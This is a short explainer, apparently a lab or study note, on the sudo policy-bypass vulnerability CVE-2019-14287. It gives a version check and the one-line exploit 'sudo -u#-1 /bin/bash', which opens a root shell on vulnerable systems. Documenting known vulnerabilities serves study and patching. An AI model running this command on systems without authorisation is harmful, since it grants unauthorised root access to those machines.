# Sudo-1.8.27

## What's sudo?

Sudo is a program for Unix-like computer operating systems that enables users to run programs with the security privileges of another user, by default the superuser.

## The vulnerability

The sudo vulnerability **CVE-2019-14287** is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access. Exploiting the vulnerability requires the user to have sudo privileges that allow them to run commands with an arbitrary user ID, except root.

### Affected version

< 1.8.28

### How to explore

1. First step is discovery sudo version:

```
sudo -V
```

2. If the version is vulnerable, run the follow command to get a root bash:

```
sudo -u#-1 /bin/bash
```
